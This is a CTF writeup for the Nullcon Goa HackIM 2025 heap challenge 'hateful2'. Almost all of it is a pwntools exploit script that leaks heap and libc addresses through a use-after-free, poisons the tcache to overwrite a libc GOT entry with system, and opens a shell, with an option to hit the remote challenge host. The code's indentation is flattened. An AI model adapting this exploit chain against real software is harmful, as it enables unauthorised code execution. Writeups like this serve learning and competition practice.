---
title: "hateful2 - Nullcon Goa HackIM 2025 CTF"
category: "pwn"
subcategory: "heap"
type: "writeup"
tags: ["pwn", "heap", "tcache", "use-after-free", "tcache-poisoning", "hateful2", "nullcon-goa-hackim-2025-ctf", "2025", "ctf-writeup"]
summary: "Powerful UAF, we use UAF to leak heap & libc, and do tcache poisoning to overwrite LIBC GOT to system"
source:
  name: "CTFtime writeup #39903"
  url: "https://ctftime.org/writeup/39903"
ctf:
  name: "Nullcon Goa HackIM 2025 CTF"
  year: 2025
  challenge: "hateful2"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2025 CTF
- **Task:** hateful2
- **Author team:** thehackerscrew
- **CTFtime:** <https://ctftime.org/writeup/39903>

---
Powerful UAF, we use UAF to leak heap & libc, and do tcache poisoning to overwrite LIBC GOT to system

```

from pwn import *  
from sys import *

#context.terminal = ["tmux", "splitw", "-h"]  
elf = context.binary = ELF("./hateful2_patched")  
p = process("./hateful2_patched")  
libc = ELF("./libc.so.6")

HOST = '52.59.124.14'  
PORT = 5022

cmd = """  
b*main  
"""  
if(argv[1] == 'gdb'):  
gdb.attach(p,cmd)  
elif(argv[1] == 'rm'):  
p = remote(HOST,PORT)

def add(idx, size, data):  
p.sendlineafter(b'>> ', b'1')  
p.sendlineafter(b'Index: ', str(idx))  
p.sendlineafter(b'Size: ', str(size))  
p.sendafter(b'>> ', data)

def delete(idx):  
p.sendlineafter(b'>> ', b'4')  
p.sendlineafter(b'Index: ', str(idx))

def view(idx):  
p.sendlineafter(b'>> ', b'3')  
p.sendlineafter(b'Index: ', str(idx))  
p.recvuntil(b'Message: ')  
leak = u64(p.recvn(6).ljust(8, b'\x00'))  
return leak

def edit(idx, data):  
p.sendlineafter(b'>> ', b'2')  
p.sendlineafter(b'Index: ', str(idx))  
p.sendafter(b'>> ', data)

def defuscate(x,l=64):  
p = 0  
for i in range(l*4,0,-4): # 16 nibble  
v1 = (x & (0xf << i )) >> i  
v2 = (p & (0xf << i+12 )) >> i+12  
p |= (v1 ^ v2) << i  
return p

def obfuscate(p, adr):  
return p^(adr>>12)

add(0, 0x100, b'A'*8)  
add(1, 0x100, b'/bin/sh\x00')  
add(2, 0x100, b'/bin/sh\x00')  
delete(0)  
for i in range(6):  
edit(0, b'A'*0x10)  
delete(0)

heap = defuscate(view(0)) - 0x2a0  
print(hex(heap))  
delete(1)

leak = view(1)  
print(hex(leak))  
libc.address = leak - 0x1d2cc0

target = obfuscate(libc.address+0x1d2000+0x80, heap+0x2a0)  
edit(0, p64(target))

add(3, 0x100, b'/bin/sh\x00')  
add(4, 0x100, p64(libc.sym['system'])*4)

p.interactive()  
```
